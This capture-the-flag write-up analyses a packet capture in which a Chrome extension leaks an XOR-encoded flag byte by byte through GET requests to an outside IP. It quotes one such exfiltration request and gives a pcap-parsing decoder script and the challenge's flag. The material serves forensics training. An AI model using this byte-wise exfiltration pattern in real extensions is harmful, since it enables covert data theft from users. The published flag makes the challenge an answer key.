x-tension Solution
________________________________________
Challenge Description
"Trying to get good at something while watching YouTube isn't the greatest idea..."
We’re given a network capture file (chal.pcapng). The title “x-tension” immediately suggests something related to a browser extension.
________________________________________
Step 1 – Inspecting the PCAP
Opening the capture in Wireshark and filtering for HTTP traffic:
http
I noticed this request:
GET /FunnyCatPicsExtension.crx
That .crx file is a Chrome extension package — a strong hint that the challenge involves extension-based traffic.
________________________________________
Step 2 – Suspicious HTTP Requests
Scrolling further, I found many suspicious GET requests to an odd IP:
GET /?t=5e HTTP/1.1
Host: 192.9.137.137:42552
The query string t=XX changes each time. This pattern looked like data being exfiltrated one byte at a time.
________________________________________
Step 3 – Extract the Bytes
By collecting all t=XX values from the GETs, we get:
5e 54 43 51 4c 52 4f 43 52 59 44 5e 58 59 44 68
5a 5e 50 5f 43 68 5d 42 44 43 68 44 42 54 5c 4a
When converted from hex to ASCII, this yields:
^TCQLROCRYD^XYDhZ^P_Ch]BDChDBT\J
Clearly not plaintext — looks encoded.
________________________________________
Step 4 – Decoding
Since the traffic was exfiltrated one byte at a time, the simplest encoding is XOR with a single key.
Testing single-byte XOR keys, key 0x37 (decimal 55) works:
ictf{extensions_might_just_suck}
________________________________________
Step 5 – The Flag
ictf{extensions_might_just_suck}
________________________________________
Automated Extraction (Python Script)
Here’s a reproducible script that parses the PCAP with pyshark:
#!/usr/bin/env python3
"""
x-tension extractor
- Collects /?t=XX values from HTTP GET requests in the PCAP
- Reassembles them as bytes
- XOR-decodes with key 0x37
"""

import sys, re

def xor_bytes(data, key):
    return bytes(b ^ key for b in data)

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file.pcapng>")
        sys.exit(1)

    pcap_path = sys.argv[1]
    import pyshark

    cap = pyshark.FileCapture(
        pcap_path,
        display_filter='http.request and http.request.uri contains "t="'
    )
    data = []
    for pkt in cap:
        try:
            uri = pkt.http.request_uri  # e.g. "/?t=5e"
            m = re.search(r"t=([0-9a-fA-F]{2})", uri)
            if m:
                data.append(int(m.group(1), 16))
        except Exception:
            continue
    cap.close()

    raw = bytes(data)
    print("[*] Raw bytes:", raw)
    decoded = xor_bytes(raw, 0x37)
    print("[+] Decoded:", decoded.decode())

if __name__ == "__main__":
    main()
Run:
pip install pyshark
python3 extract_xtension.py chal.pcapng
Output:
[*] Raw bytes: b'^TCQLROCRYD^XYDhZ^P_Ch]BDChDBT\J'
[+] Decoded: ictf{extensions_might_just_suck}
________________________________________
Manual Wireshark Method (No Python Needed)
1.	Open the PCAP in Wireshark.
2.	Apply the filter:
3.	http.request.uri contains "t="
4.	Right click → Copy → All Visible Packet Details as Text.
5.	Extract just the hex values after t= (e.g. 5e 54 43 …).
6.	Paste into a hex editor or CyberChef.
7.	Apply From Hex → XOR with 0x37.
8.	The output reveals the flag:
9.	ictf{extensions_might_just_suck}
________________________________________
Final Flag
ictf{extensions_might_just_suck}
